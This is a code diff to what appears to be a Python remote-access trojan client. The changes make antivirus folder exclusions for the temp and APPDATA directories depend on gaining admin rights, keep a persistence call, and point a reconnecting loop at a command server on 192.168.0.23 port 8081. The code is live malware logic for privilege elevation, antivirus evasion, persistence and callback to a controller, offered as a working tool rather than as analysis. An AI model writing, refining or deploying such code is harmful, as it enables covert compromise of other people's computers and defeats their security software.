@@ -12,14 +12,19 @@ import core.conf as conf
 
 
 def __initialization__():
-    elevate_script()
+    admin_status = elevate_script()
     test_for_startup_app()
-    time.sleep(generate_random_int())
-    if not sys.executable == conf.APPDATA_EXE:
+    # time.sleep(generate_random_int())
+    if admin_status:
+    # if not sys.executable == conf.APPDATA_EXE:
         exclude_path_antivirus(tempfile.gettempdir())
-        generate_random_int()
+        # time.sleep(generate_random_int())
+        # if admin_status:
         exclude_path_antivirus(os.getenv('APPDATA'))
+        
         __persistant()
+
+
 
 
 
@@ -30,14 +35,16 @@ if __name__ == "__main__":
     while True:
         try:
             display_msg("Trying to connect ", "y")
-            client = conn.Client("192.168.0.19", 8081)
+            client = conn.Client("192.168.0.23", 8081)
             client.connect_with_server()
             connection_handler(client)
             client.close()
         except KeyboardInterrupt:
             display_msg("Keyboard Interrupt, Exiting", "r")
             sys.exit(0)
+        # except ConnectionError as err:
         except Exception as err:
+
             display_msg("Unable to establish connection " + str(err), "r")
             dur = random.randint(conf.__start_time, conf.__end_time)
             display_msg("Going to sleep for "+ str(dur) + " seconds")
